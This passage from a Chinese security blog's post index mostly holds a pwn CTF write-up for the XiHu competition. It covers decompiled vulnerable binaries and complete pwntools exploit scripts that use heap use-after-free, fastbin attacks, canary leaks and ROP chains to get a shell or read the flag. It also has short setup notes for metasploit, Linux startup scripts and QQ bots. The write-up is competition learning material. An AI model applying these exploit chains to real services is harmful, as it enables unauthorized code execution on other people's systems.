&#x27;\\x00&#x27;)\tflag_addr  = heap_base + 0xc0\tad(1, u64(flag)) # heap_base  + 0xc0\tad(1, stack_ret)\tlibc_read = libc_base + libc.sym[&#x27;read&#x27;]\tlibc_open = libc_base + libc.sym[&#x27;open&#x27;]\tlibc_puts = libc_base + libc.sym[&#x27;puts&#x27;]\tpop_rdi = libc_base + 0x2155f\tpop_rsi = libc_base + 0x23e8a\tpop_rdx = libc_base + 0x1b96\tpop_rdx_rsi = libc_base + 0x130889#\t# ret to here#\t# open\tad(2, pop_rdi)\tad(2, flag_addr)\tad(2, pop_rdx_rsi)\tad(2, 0)\tad(2, 0)\tad(2, libc_open)\t# read\tad(2, pop_rdi)\tad(2, 3)\tad(2, pop_rsi)\tad(2, flag_addr + 0x100)\tad(2, pop_rdx)\tad(2, 0x100)\tad(2, libc_read)\t# puts\tad(2, pop_rdi)\tad(2, flag_addr + 0x100)\tad(2, libc_puts)\t#db()\t# trigger\tad(2, 0)&#x27;&#x27;&#x27;.text:0000000000001032                 leave.text:0000000000001033                 retn&#x27;&#x27;&#x27;def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n经过漫长的一小时攻打, 终于出了flag\n[*] rm: 9157                                                      │[*] rm: 9158                                                      │[*] rm: 9159                                                      │[*] environ: 0x7fc86fe37098                                       │[*] stack: 0x7ffefb537f88                                         │ [*] stack ret: 0x7ffefb537e78                                     │[*] heap_0x41: 0x5613330b7ee0                                     │[*] heap_0x71: 0x5613330b7f30                                     │[*] Switching to interactive mode                                 │n1ctf&#123;77381c470c0d50e9ecd15a650e409176&#125;                           │                                                                  │[*] Got EOF while reading in interactive\n\n\n\n\n\neasy write使用cutter反编译\nundefined8 main(void)&#123;    undefined8 uVar1;    int64_t in_FS_OFFSET;    int64_t var_20h;    int64_t var_18h;    int64_t var_10h;    int64_t var_8h;        var_8h = *(int64_t *)(in_FS_OFFSET + 0x28);    func_0x000010b0(_reloc.stdout, 0);    func_0x000010b0(_reloc.stdin, 0);    func_0x000010b0(_reloc.stderr, 0);    alarm(0x3c);    sleep(2);    printf(&quot;Here is your gift:%p\\n&quot;, _reloc.setbuf);    var_18h = malloc(0x300);    write(1, &quot;Input your message:&quot;, 0x13);    read(0, var_18h, 0x2ff);    write(1, &quot;Where to write?:&quot;, 0x10);    read(0, &amp;var_20h, 8);    *(int64_t *)var_20h = var_18h;    var_10h = malloc(0x30);    write(1, &quot;Any last message?:&quot;, 0x12);    read(0, var_10h, 0x2f);    .plt.sec(var_10h);    uVar1 = 0;    if (var_8h != *(int64_t *)(in_FS_OFFSET + 0x28)) &#123;        uVar1 = __stack_chk_fail();    &#125;    return uVar1;&#125;\n\n","categories":["ctf"],"tags":["pwn"]},{"title":"linux-config-startup-script","url":"/2020/10/10/env/linux/linux-config-startup-script/","content":"Archlinux 如何设置自己的开机脚本以下命令以root用户执行 1.创建一个启动service脚本\nvim /etc/systemd/system/rc-local.service\n\n\n[Unit]Description=&quot;/etc/rc.local Compatibility&quot; [Service]Type=oneshotExecStart=/etc/rc.local startTimeoutSec=0StandardInput=ttyRemainAfterExit=yesSysVStartPriority=99[Install]WantedBy=multi-user.target\n\n2.创建 &#x2F;etc&#x2F;rc.local 文件\nvim /etc/rc.local\n\n\n#!/bin/sh# /etc/rc.localif test -d /etc/rc.local.d; then    for rcscript in /etc/rc.local.d/*.sh; do        test -r &quot;$&#123;rcscript&#125;&quot; &amp;&amp; sh $&#123;rcscript&#125;    done    unset rcscriptfi\n\n3.添加执行权限\nchmod a+x /etc/rc.local\n\n4.添加&#x2F;etc&#x2F;rc.local.d文件夹\nmkdir /etc/rc.local.d\n\n5.设置开机自启\nsystemctl enable rc-local.service\n\n sh脚本放在/etc/rc.local.d/里面就可以了 \n","categories":["env"],"tags":["linux"]},{"title":"Archlinux 安装 metasploit","url":"/2020/10/10/env/linux/install_metaploit/","content":"Archlinux 安装 metasploit配置源vim打开&#x2F;etc&#x2F;pacman.conf\n加入\n [archlinuxcn]SigLevel = Optional TrustAllServer = http://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch\n\n安装metasploit和postgresql 数据库yaourt -S metasploit yaourt -S postgresql\n\n\n\n配置postgresql数据库sudo su - postgres -c &quot;initdb --locale en_US.UTF-8 -E UTF8 -D &#x27;/var/lib/postgres/data&#x27;&quot;\n\n若执行提示: 您的帐户已失效；请与系统管理员取得联系使用解决\n\nsudo -i -u postgres\nnitdb –locale en_US.UTF-8 -E UTF8 -D ‘&#x2F;var&#x2F;lib&#x2F;postgres&#x2F;data’\n\n启动 数据库\nsystemctl start postgresql\n\n创建数据库用户并新建一个数据库\nsudo -i -u postgrescreateuser msf -P# 密码 我设置的也是msfcreatedb --owner=msf msf\n\n\n\n配置Metasploit 链接 postgresqlcd /opt/metasploit/config/sudo cp database.yml.example database.ymlsudo vim database.yml\n\n修改如下:\ndevelopment: &amp;pgsql  adapter: postgresql  database: msf  username: msf  password: msf  host: localhost  port: 5432  pool: 200  timeout: 5\n\n安装完成\n","categories":["env"],"tags":["linux"]},{"title":"mirai QQ机器人环境安装","url":"/2020/10/10/dev/others/qq_bot/mirai/","content":"mirai QQ机器人环境安装step1 安装 mirai-console通过mcl-installer安装\ngithub: https://github.com/iTXTech/mcl-installer\n下载linux版本\n也可以通过MiraiOk进行安装\ngithub: https://github.com/LXY1226/MiraiOK\nstep2 安装 mirai-http-api将jar包放到2中项目里的plugins文件夹下，配置config\\MiraiApiHttp\\setting.yml文件里的authKey，自己随便填写。\nstep3 启动mirai-console登录QQ号mcl的话直接运行.&#x2F;mcl即可\n出现滑动认证时./mcl --update-package net.mamoe:mirai-login-solver-selenium --channel nightly --type plugin\n\nref: https://github.com/project-mirai/mirai-login-solver-selenium\nstep 4安装graia模块github: https://github.com/GraiaProject/Application\npip3 install graia-application-miraipip3 install graia-broadcast --upgrade\n\n\n\n\n\nversion:graia-application-mirai==0.19.2graia-broadcast==0.8.11graia.scheduler==0.0.4\n\n\n\nstep 5编写qq机器人脚本from graia.broadcast import Broadcastfrom graia.application import GraiaMiraiApplication, Sessionfrom graia.application.message.chain import MessageChainimport asynciofrom graia.application.message.elements.internal import Plainfrom graia.application.friend import Friendloop = asyncio.get_event_loop()bcc = Broadcast(loop=loop)app = GraiaMiraiApplication(    broadcast=bcc,    connect_info=Session(        host=&quot;http://localhost:8080&quot;, # 填入 httpapi 服务运行的地址        authKey=&quot;0123456789&quot;, # 填入在setting.yml中设置的authKey        account=88888888, # 你的机器人的 qq 号        websocket=True # Graia 已经可以根据所配置的消息接收的方式来保证消息接收部分的正常运作.    ))@bcc.receiver(&quot;FriendMessage&quot;)async def friend_message_listener(message: MessageChain, friend: Friend, app: GraiaMiraiApplication):    msg = message.asDisplay()    if msg.startswith(&quot;.help&quot;):        await app.sendFriendMessage(friend, MessageChain(__root__=[Plain(&quot;.help\\t显示帮助指令\\r\\n.copy\\t复读&quot;)]))    elif msg.startswith(&quot;.copy &quot;):        msg = msg[6:]        await app.sendFriendMessage(friend, MessageChain(__root__=[Plain(msg)]))    else:        await app.sendFriendMessage(friend, MessageChain(__root__=[Plain(&quot;收到!&quot;)]))app.launch_blocking()\n\n运行即可\n","categories":["dev"],"tags":["dev"]},{"title":"使用Docker安装酷Q","url":"/2020/10/09/dev/others/qq_bot/%E4%BD%BF%E7%94%A8docker%E5%AE%89%E8%A3%85%E9%85%B7Q/","content":"使用Docker安装酷Q下载酷Q镜像sudo docker pull coolq/wine-coolq\n\n创建一个目录,用于cooq映射的数据目录mkdir  /coolq-data\n\n因为数据是最重要的，而且后面你的酷Q应用都要上传到此目录才能应用上的\n后台运行指定端口号sudo docker run --name=coolq -d -p 8081:9000 -v  /coolq-data:/home/user/coolq -e VNC_PASSWD=41889411 -e  COOLQ_ACCOUNT=1557203539 coolq/wine-coolq\n\n\n\n采用默认端口号sudo docker run --name=coolq -d --network=host  -v  /coolq-data:/home/user/coolq -e VNC_PASSWD=41889411 -e  COOLQ_ACCOUNT=1557203539 coolq/wine-coolq\n\n其中部分参数根据自己的需求替换：\n 远程监听端口 8081(9000映射成8081) 数据存放位置\n &#x2F;coolq-data（&#x2F;home&#x2F;user&#x2F;coolq 映射到&#x2F;root&#x2F;coolq-data） 远程访问密码 41889411（只能设8位） 机器人 QQ 帐号 1557203539\n这里要注意的是，首先你远程监听的端口，也就是自定义的web端口需要在服务器防火墙和云安全组都放行其次，-d 指的是后台运行容器，-v后面接的就是将服务器的自己定义的coolq数据目录映射到容器内的&#x2F;home&#x2F;user&#x2F;coolq目录，-e是设置容器的系统环境因为我们后面要通过vnc连接，所以要指定VNC_PASSWD。而酷Q要登录的qq小号（充当机器人）也可以通过-e COOLQ_ACCOUNT  去指定\n","categories":["dev"],"tags":["dev"]},{"title":"西湖论剑 Pwn WP","url":"/2020/10/08/security/ctf/compitation/wp-xh-2020/","content":"Pwnmmutag本题下载\nchecksecArch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x3ff000)\n\n\n\nVulsigned __int64 __fastcall rm(int idx)&#123;  signed __int64 result; // rax  if ( ptr[idx] )  &#123;    free(ptr[idx]);    --ptr[0];                                   // uaf    result = 0LL;  &#125;  else  &#123;    puts(&quot;you need add this content&quot;);    result = 1LL;  &#125;  return result;&#125;\n\n利用漏洞再于uaf漏洞, 因为真正的添加和释放是顺序性的, 若释放不是最后一个chunk, 会造成释放最后一个chunk, 该所管理的指针数组中的值清0,形成uaf漏洞\n思路程序没有开启pie保护,且程序起初给了堆栈地址, 开辟内存的大小是固定的, 我们只能使用一次fastbin attack.那么我们就想到malloc到堆栈里面, 但是我在堆栈里找了好久满足8字节宽度的0x70~ 0x7f的值, 找到一个, 但是已经在main函数外去了, 且没法break退出main函数。但是我们注意到.\nunsigned __int64 mode_2()&#123;  int i; // ST0C_4  int v1; // ST0C_4  int v3; // [rsp+8h] [rbp-28h]  char buf; // [rsp+10h] [rbp-20h] // 存在溢出到 cannary  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  while ( 1 )  &#123;    while ( 1 )    &#123;      while ( 1 )      &#123;        while ( 1 )        &#123;          menu_0();          v3 = input_n();          if ( v3 != 1 )            break;          puts(&quot;please input your id:&quot;);          i = input_n();          if ( (unsigned int)add(i) != 1 )            puts(&quot;OK!&quot;);        &#125;        if ( v3 != 2 )          break;        puts(&quot;please input your id:&quot;);        v1 = input_n();        if ( (unsigned int)rm(v1) != 1 )          puts(&quot;OK!&quot;);      &#125;      if ( v3 != 3 )        break;      read(0, &amp;buf, 0x20uLL); // 存在输入      printf(&quot;Your content: %s\\n&quot;, &amp;buf);    &#125;    if ( v3 == 4 )      break;    Introl();                                   // Intro  &#125;  return __readfsqword(0x28u) ^ v5;&#125;\n\n就是输入3的时候我们可以输入一些东西, 我们就可以在这里布置fastbin 的大小为0x71。若我们开辟内存到堆栈里面, 那么就在堆栈里面布置rop链, 采用ret2libc的打法就ok, 但是我们还得需要泄漏cannary， 这里也是采用 这个输入方式进行泄漏cannary, 输入4即可退出该函数调用rop。\n还有一个坑ret2libc的时候, 我们需要找一个再次输入到stack里的代码, 方便我们泄漏libc之后然后再次利用。我找的代码如下:\n0400B5A                 lea     rax, [rbp+buf].text:0000000000400B5E                 mov     rsi, rax.text:0000000000400B61                 mov     edi, offset format ; &quot;Your content: %s\\n&quot;.text:0000000000400B66                 mov     eax, 0.text:0000000000400B6B                 call    _printf.text:0000000000400B70                 jmp     loc_400AB0\n\n为啥要选这段代码, 灯下你就明白, 总之我们需要找一块代码需要再次向栈里写入数据, 但是没法让输入完毕之后就ret, 而下面这个代码可以控制向哪输入数据并返回, 存在个leave指令, 堆栈就发生了迁移, 没法利用。调试的时候, 发现了一个重要的地方就是, rbp我们是可控的, 且程序没开pie， 那么我们能否改got表在调用该函数岂不是实现了。那我就选择改atoi为system，在调用atoi的时候传入’&#x2F;bin&#x2F;sh’即可。且该代码块执行后是个循环的, 会调用到atoi。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# author: i0gan# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;elf_path  = &#x27;mmutag.bk&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.23&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;183.129.189.61&quot;server_port = 55304# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(i, d):\tsla(&#x27;:&#x27;, &#x27;1&#x27;)\tsla(&#x27;:&#x27;, str(i))\tsa(&#x27;content&#x27;, d)def rm(i):\t\tsla(&#x27;:&#x27;, &#x27;2&#x27;)\tsla(&#x27;:&#x27;, str(i))def q():\tsla(&#x27;:&#x27;, &#x27;4&#x27;)def intro(d):\tsla(&#x27;:&#x27;, &#x27;5&#x27;)\tsa(&#x27;duce&#x27;, d)\t#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tsla(&#x27;:&#x27;, &#x27;i0gan&#x27;)\tru(&#x27;0x&#x27;)\tstack_leak  = int(ru(&#x27;:&#x27;), 16)\tattack_stack = stack_leak - (0x7fffffffed40 - 0x7fffffffecd8) +0x20\tli(&#x27;leak: &#x27; + hex(stack_leak))\tsla(&#x27;:&#x27;, &#x27;2&#x27;)\tsla(&#x27;:&#x27;, &#x27;3&#x27;)\ts(&#x27;A&#x27; * 0x18 + &#x27;\\x21&#x27;)\tru(&#x27;\\x21&#x27;)\tcannary = u64(&#x27;\\x00&#x27; + ru(&#x27;\\n&#x27;)[0:7])\tli(&#x27;cannary: &#x27; + hex(cannary))\tsla(&#x27;:&#x27;, &#x27;3&#x27;)\tsl(p64(0x71))\t#leak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;)\t#libc_base = leak - ( 0x7fffffffed20 - 0x7ffff7a0d000)\t#li(&#x27;leak: &#x27; + hex(leak))\t#li(&#x27;libc_base: &#x27; + hex(libc_base))\t\tad(1, &#x27;A&#x27; * 0x68)\tad(2, &#x27;B&#x27; * 0x68)\tad(3, &#x27;C&#x27; * 0x60)\trm(1)\trm(2)\trm(1)\tp_addr = 0x6020C0\tbss_target = p_addr - 0x23\tad(4, p64(attack_stack))\tad(5, &#x27;A&#x27;)\tad(6, &#x27;A&#x27;)\tli(&#x27;target : &#x27; + hex(attack_stack))\t# attack to stack\tpop_rdi = 0x400d23\tret_again = 0x400A50\tret_again = 0x400B44\tp = b&#x27;A&#x27; * 0x10\tp += p64(cannary)\tp += p64(elf.got[&#x27;atoi&#x27;] + 0x20)\tp += p64(pop_rdi)\tp += p64(elf.got[&#x27;read&#x27;])\tp += p64(elf.plt[&#x27;puts&#x27;])\tp += p64(ret_again)\t#p += p64(0x400942)\tad(7, p)\tq()\t\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - libc.sym[&#x27;read&#x27;]\tlibc_sys = libc_base + libc.sym[&#x27;system&#x27;]\t#db()\tp = p64(libc_sys)\ts(p)\t\tsl(&#x27;/bin/sh&#x27;)\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\nezhttp 思路1本题下载\nchecksecArch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled\n\n该程序是一个模拟http协议进行交互的程序, 开启了pie, 沙箱, 所以只能使用传统的row来打了\nunsigned __int64 sandbox()&#123;  __int16 v1; // [rsp+0h] [rbp-40h]  __int16 *v2; // [rsp+8h] [rbp-38h]  __int16 v3; // [rsp+10h] [rbp-30h]  char v4; // [rsp+12h] [rbp-2Eh]  char v5; // [rsp+13h] [rbp-2Dh]  int v6; // [rsp+14h] [rbp-2Ch]  __int16 v7; // [rsp+18h] [rbp-28h]  char v8; // [rsp+1Ah] [rbp-26h]  char v9; // [rsp+1Bh] [rbp-25h]  int v10; // [rsp+1Ch] [rbp-24h]  __int16 v11; // [rsp+20h] [rbp-20h]  char v12; // [rsp+22h] [rbp-1Eh]  char v13; // [rsp+23h] [rbp-1Dh]  int v14; // [rsp+24h] [rbp-1Ch]  __int16 v15; // [rsp+28h] [rbp-18h]  char v16; // [rsp+2Ah] [rbp-16h]  char v17; // [rsp+2Bh] [rbp-15h]  int v18; // [rsp+2Ch] [rbp-14h]  __int16 v19; // [rsp+30h] [rbp-10h]  char v20; // [rsp+32h] [rbp-Eh]  char v21; // [rsp+33h] [rbp-Dh]  int v22; // [rsp+34h] [rbp-Ch]  unsigned __int64 v23; // [rsp+38h] [rbp-8h]  v23 = __readfsqword(0x28u);  v3 = 32;  v4 = 0;  v5 = 0;  v6 = 0;  v7 = 21;  v8 = 1;  v9 = 0;  v10 = 59;  v11 = 53;  v12 = 1;  v13 = 0;  v14 = 0;  v15 = 6;  v16 = 0;  v17 = 0;  v18 = 0;  v19 = 6;  v20 = 0;  v21 = 0;  v22 = 2147418112;  v1 = 5;  v2 = &amp;v3;  prctl(38, 1LL, 0LL, 0LL, 0LL, *(_QWORD *)&amp;v1, &amp;v3, 32LL, *(_QWORD *)&amp;v7, *(unsigned int *)&amp;v11, 6LL, *(_QWORD *)&amp;v19);  prctl(22, 2LL, &amp;v1);  return __readfsqword(0x28u) ^ v23;&#125;\n\n\n\nmain函数\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  char *cont; // [rsp+8h] [rbp-1838h]  char method; // [rsp+10h] [rbp-1830h]  char url; // [rsp+20h] [rbp-1820h]  char content; // [rsp+30h] [rbp-1810h]  char input; // [rsp+830h] [rbp-1010h]  unsigned __int64 v9; // [rsp+1838h] [rbp-8h]  v9 = __readfsqword(0x28u);  sub_DF0(a1, a2, a3);  sub_E4B();  sandbox();  sub_F42();  while ( True )  &#123;    puts(&quot;\\n======= Send Http packet to me: ========&quot;);    memset(&amp;input, 0, 0x1000uLL);    if ( (signed int)read(0, &amp;input, 0x1000uLL) &lt; 0 )      puts(&quot;Server error!&quot;);    __isoc99_sscanf(&amp;input, &quot;%s %s %s&quot;, &amp;method, &amp;url, &amp;content);    cont = get_end(&amp;input);    if ( strcmp(&amp;method, &quot;GET&quot;) &amp;&amp; strcmp(&amp;method, &quot;POST&quot;) )    &#123;      send_to((__int64)&quot;HTTP/1.1 405 Method Not Allowed&quot;, (__int64)&quot;Method not allowed&quot;);      exit(0);    &#125;    if ( !strstr(&amp;input, &quot;Cookie: &quot;) || !(unsigned int)check(&amp;input) )    &#123;      send_to((__int64)&quot;HTTP/1.1 401 Unauthorized&quot;, (__int64)&quot;You not login!&quot;);      exit(0);    &#125;    if ( !strcmp(&amp;url, &quot;/&quot;) )      send_to((__int64)&quot;HTTP/1.1 200 OK&quot;, (__int64)&quot;Hello admin!&quot;);    if ( !strcmp(&amp;method, &quot;POST&quot;) )    &#123;      if ( !strcmp(&amp;url, &quot;/create&quot;) )      &#123;        add(cont);      &#125;      else if ( !strcmp(&amp;url, &quot;/del&quot;) )      &#123;        del((__int64)cont);      &#125;      else if ( !strcmp(&amp;url, &quot;/show&quot;) )      &#123;        show();                                 // nothing      &#125;      else if ( !strcmp(&amp;url, &quot;/edit&quot;) )      &#123;        edit(cont);      &#125;      else      &#123;        send_to((__int64)&quot;HTTP/1.1 404 NOT FOUND&quot;, (__int64)&quot;page not found!&quot;);      &#125;    &#125;  &#125;  return 0LL;&#125;\n\n\n\n有token和cookie检查, 交互之前需要绕过.\n检查函数:\n_BOOL8 __fastcall check(const char *a1)&#123;  __int64 v1; // r8  _BOOL8 result; // rax  signed int i; // [rsp+14h] [rbp-8Ch]  char *v4; // [rsp+18h] [rbp-88h]  char *token; // [rsp+20h] [rbp-80h]  char s; // [rsp+30h] [rbp-70h]  char u; // [rsp+40h] [rbp-60h]  unsigned __int64 v8; // [rsp+98h] [rbp-8h]  v8 = __readfsqword(0x28u);  memset(&amp;s, 0, 0x10uLL);  memset(&amp;u, 0, 0x50uLL);  v4 = strstr(a1, &quot;Cookie: &quot;) + 8;  token = strstr(a1, &quot;token: &quot;);  if ( !v4 || !token )    return 0LL;  __isoc99_sscanf(v4, &quot;%10[^=]=%80s&quot;, &amp;s, &amp;u, v1);  for ( i = 7; token[i] != &#x27;\\r&#x27;; ++i )    ;  token[i] = 0;  if ( !strncmp(&amp;s, &quot;user&quot;, 4uLL) &amp;&amp; !strncmp(&amp;u, &quot;admin&quot;, 5uLL) )    result = strstr(haystack, token + 7) != 0LL;// check token  else    result = 0LL;                               // false  return result;&#125;\n\n绕过方式:\nCookie: user=admin \\r\\ntoken: \\r\\n\n\n因为采用strstr进行判断的, 若传入字符串中为空, 那么这个就会返回haystack字符串中的末尾。haystack是一个随机字符串。\nvulunsigned __int64 __fastcall del(__int64 a1)&#123;  __int64 v1; // r8  int v3; // [rsp+1Ch] [rbp-34h]  char s; // [rsp+20h] [rbp-30h]  char nptr; // [rsp+30h] [rbp-20h]  unsigned __int64 v6; // [rsp+48h] [rbp-8h]  v6 = __readfsqword(0x28u);  memset(&amp;s, 0, 0xAuLL);  __isoc99_sscanf(a1, &quot;%10[^=]=%2s&quot;, &amp;s, &amp;nptr, v1);  v3 = atoi(&amp;nptr);  if ( strncmp(&amp;s, &quot;index&quot;, 5uLL) )  &#123;    send_to((__int64)&quot;HTTP/1.1 404 Not Found&quot;, (__int64)&quot;No!You can&#x27;t&quot;);    exit(0);  &#125;  if ( v3 &lt; 0 || v3 &gt; 15 || !p_addr[2 * v3] )  &#123;    send_to((__int64)&quot;HTTP/1.1 404 Not Found&quot;, (__int64)&quot;No!You can&#x27;t&quot;);    exit(0);  &#125;  free(p_addr[2 * v3]);                         // uaf  p_addr[2 * v3 + 1] = 0LL;  send_to((__int64)&quot;HTTP/1.1 200 OK&quot;, (__int64)&quot;Delete success!&quot;);  return __readfsqword(0x28u) ^ v6;&#125;\n\n存在一个uaf漏洞, 指针没有清0, 且在编辑中只对指针进行判断, 直接可以编辑使用后的函数.\n思路今天我在调试的时候吧alsr关了, 导致heap与elf地址发生连续, 我就以为给的heap地址可以泄漏elf地址, 打入ptr_addr然后修改free为puts打印atoi泄漏libc, 然后再次泄漏Libc中environ泄漏堆栈, 再次打入堆栈中布置row, 原来是我想多了, 若elf与heap连续的话采用此方法还行, 不连续的话就类似与爆破了, 但是今天我尝试了好多次, 也泄漏了远程libc,,只需再次弄后面的就行。爆破几率有点低, 通过以下已知\npwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA    0x560c0c492000     0x560c0c495000 r-xp     3000 0      /home/xh/pwn2/ezhttp.o    0x560c0c694000     0x560c0c695000 r--p     1000 2000   /home/xh/pwn2/ezhttp.o    0x560c0c695000     0x560c0c696000 rw-p     1000 3000   /home/xh/pwn2/ezhttp.o    0x560c0c97d000     0x560c0c99e000 rw-p    21000 0      [heap]    0x7f1898273000     0x7f189845a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so    0x7f189845a000     0x7f189865a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so    0x7f189865a000     0x7f189865e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so    0x7f189865e000     0x7f1898660000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so\n\n爆破几率为 1 &#x2F; 4096, 今天索性有一次泄漏, 那是万幸…\n坑点\nsize = strlen(&amp;src);strncpy(p_addr[2 * i], &amp;src, size);\n\n开辟的大小需要由字符串来决定,payload中就不能出现\\x00了\n把今天有一次泄漏libc的exp先贴着.\n#!/usr/bin/env python#-*- coding:utf-8 -*-# author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)elf_path  = &#x27;ezhttp.o&#x27;libc_path = &#x27;./libc.so.6&#x27;libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;# remote server ip and portserver_ip = &quot;183.129.189.62&quot;server_port = 62002# if local debugLOCAL = 1LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(d):\tprint(d)\tp =  b&#x27;POST /create HTTP/1.1 \\r\\n&#x27;\tp += b&#x27;Cookie: user=admin \\r\\n&#x27;\tp += b&#x27;token: \\r\\n&#x27;\tp += b&#x27;\\r\\n&#x27;\tp += b&#x27;content=&#x27;\tp += d\tsa(&#x27;======= Send Http packet to me: ========\\n&#x27;, p)\tdef rm(i):\tp =  b&#x27;POST /del HTTP/1.1 \\r\\n&#x27;\tp += b&#x27;Cookie: user=admin \\r\\n&#x27;\tp += b&#x27;token: \\r\\n&#x27;\tp += b&#x27;\\r\\n&#x27;\tp += b&#x27;index=&#x27; + str(i).encode()\tsa(&#x27;======= Send Http packet to me: ========\\n&#x27;, p)def md(i, d):\tp =  b&#x27;POST /edit HTTP/1.1 \\r\\n&#x27;\tp += b&#x27;Cookie: user=admin \\r\\n&#x27;\tp += b&#x27;token: \\r\\n&#x27;\tp += b&#x27;\\r\\n&#x27;\tp += b&#x27;index=&#x27; + str(i).encode()\tp += b&#x27;&amp;content=&#x27; + d + b&#x27;\\n&#x27;\tsa(&#x27;======= Send Http packet to me: ========\\n&#x27;, p)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tad(b&#x27;A&#x27; * 0x8) # 0\tru(&#x27;0x&#x27;)\tleak = int(ru(&#x27;&quot;&#x27;), 16)\tdb()\toffset = 0\tif(LOCAL):\t\toffset =  0x555555758260 - 0x555555554000\telse:\t\toffset =  0x202260\t\toffset =  0x201260\tli(&#x27;offset: &#x27; + hex(offset))\telf_base = leak - offset\tp_addr = elf_base + 0x203120\tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;elf_base: &#x27; + hex(elf_base))\trm(0)\trm(0)\trm(0)\tli(&#x27;attack to p_addr&#x27;)\t\t# attack to p_addr + 0x10 set chunk 1 -&gt; free_got\tad(p64(p_addr + 0x10)) # 1\tad(b&#x27;A&#x27; * 0x8) # 2\tfree_got = elf_base + elf.got[&#x27;free&#x27;]\tli(&#x27;free_got: &#x27; + hex(free_got))\t#db()\tad(p64(free_got)) # 3\tli(&#x27;p_addr: &#x27; + hex(p_addr))\t\trm(0)\trm(0)\trm(0)\tli(&#x27;modify free_got as puts plt&#x27;)\tmd(1, p64(elf_base + elf.plt[&#x27;puts&#x27;])[0:6])\tli(&#x27;attack to p_addr set chunk2 as atoi got&#x27;)\tad(p64(p_addr + 0x20)) # 1\tad(b&#x27;A&#x27; * 0x8) # 2\tad(p64(elf_base + elf.got[&#x27;atoi&#x27;])) # 3\t\t# leak libc\tli(&#x27;puts libc&#x27;)\trm(2)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - libc.sym[&#x27;atoi&#x27;]\tli(&#x27;libc_atoi: &#x27; + hex(leak))\tli(&#x27;libc_base: &#x27; + 